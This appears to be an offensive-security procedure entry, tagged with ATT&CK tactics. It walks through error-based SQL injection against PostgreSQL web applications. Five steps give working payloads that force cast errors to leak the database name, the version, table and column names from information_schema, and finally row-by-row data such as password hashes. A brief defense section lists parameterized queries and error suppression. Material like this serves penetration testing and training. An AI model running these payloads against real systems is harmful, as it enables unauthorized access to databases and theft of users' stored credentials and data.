---
id: 957d1175-fa46-48d2-85b8-ba46d932e1da
name: PostgreSQL-Error-Based-Injection-for-Database-and-Table-Information-Retrieval
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.743098+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1190 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/PostgreSQL]]'
  - '[[tags/SQL-Injection]]'
  - '[[tags/Error-Based-Injection]]'
commands: []
platforms:
  - Web
  - PostgreSQL
tools: []
validated: true
---

# PostgreSQL-Error-Based-Injection-for-Database-and-Table-Information-Retrieval

## Summary

This procedure demonstrates how to perform error-based SQL injection on a PostgreSQL database through a vulnerable web application to extract sensitive information such as the database version, current database name, table names, column names, and actual data from specified tables. By forcing the database to throw errors that leak this information in the error messages, attackers can map the database schema and contents without direct access.

## Description

Error-based SQL injection exploits vulnerabilities in web applications that fail to sanitize user input, allowing attackers to inject SQL payloads into queries executed against a PostgreSQL backend. When the injected code causes a type conversion or casting error (e.g., casting string data to numeric), PostgreSQL includes the erroneous data in the error message, revealing internal database details. This technique is particularly useful in blind injection scenarios where boolean-based or time-based methods are slow or unreliable. It targets the information_schema views to enumerate databases, tables, and columns, and can extend to dumping data row-by-row. The procedure assumes a POST or GET parameter vulnerable to injection, such as a login form or search field. Success depends on the application's error reporting being verbose enough to expose the leaked data.

## Requirements

1. A vulnerable web application with a SQL injection point in a user-controllable parameter (e.g., username, search query) connected to a PostgreSQL database.
2. Knowledge of the injection point, identified via manual testing or tools like sqlmap.
3. Network access to the target application (e.g., via browser, curl, or Burp Suite).
4. Basic understanding of SQL syntax and PostgreSQL-specific functions like CAST, CHR, and information_schema.

## Defense

Defensive measures and detection strategies:

- Implement prepared statements and parameterized queries to prevent injection by separating code from data.
- Use web application firewalls (WAFs) to detect and block anomalous SQL patterns in input.
- Configure PostgreSQL to suppress detailed error messages in production (e.g., via log_min_messages = 'error' and custom error handlers).
- Enable database activity monitoring to log and alert on unusual queries accessing information_schema or casting operations.
- Regularly audit application code for input sanitization and conduct penetration testing.

## Objectives

1. Extract the PostgreSQL version and current database name to understand the environment.
2. Enumerate table names from information_schema.tables to map the schema.
3. Retrieve column names for a specific table to identify data structure.
4. Dump data from a targeted table and column to exfiltrate sensitive information.

## Instructions

### Step 1: Verify Injection Point and Test Basic Error Trigger

**Context**: Confirm the parameter is vulnerable to SQL injection by appending a payload that forces an error without extracting data. This establishes the technique works and identifies how errors are displayed.

Use the following injection payload in the vulnerable parameter (e.g., via browser or curl):

**Code** ([[codes/PostgreSQL-Error-Based-Injection-Payloads]]):

```sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
```

> Append this to the injectable field, such as in a login form: username=' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1. Submit the request. The error message should include the current database name prefixed with 'DATABASE: '.

### Step 2: Extract Database Version

**Context**: Retrieve the PostgreSQL version to assess potential vulnerabilities and confirm the backend.

Inject the version payload:

**Code** ([[codes/PostgreSQL-Error-Based-Injection-Payloads]]):

```sql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
```

> Place this in a numeric-expecting field or concatenate in a string context to force a casting error. The error should reveal the version string flanked by chr(126) (~) characters, e.g., ~PostgreSQL 13.5~

### Step 3: Enumerate Table Names

**Context**: List table names using information_schema.tables, paginating with OFFSET to handle multiple results.

Inject the table enumeration payload, replacing data_offset with an integer (start at 0):

**Code** ([[codes/PostgreSQL-Error-Based-Injection-Payloads]]):

```sql
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
```

> Increment data_offset (e.g., 0,1,2...) until no more tables are returned. Errors will show table names like ~users~ or ~orders~

### Step 4: Enumerate Columns for a Specific Table

**Context**: Once a table is identified (e.g., 'users' as data_table), extract its columns to understand the schema.

Inject the column payload, setting data_table to the target table name and data_offset starting at 0:

**Code** ([[codes/PostgreSQL-Error-Based-Injection-Payloads]]):

```sql
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
```

> Errors will leak column names, e.g., ~id~, ~username~, ~password~

### Step 5: Extract Data from a Specific Table and Column

**Context**: Dump actual data from a chosen table and column (e.g., data_table='users', data_column='password'), using OFFSET for pagination.

Inject the data extraction payload:

**Code** ([[codes/PostgreSQL-Error-Based-Injection-Payloads]]):

```sql
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
```

> Start with data_offset=0 and increment. Successful errors will display data values, such as hashed passwords or sensitive info.
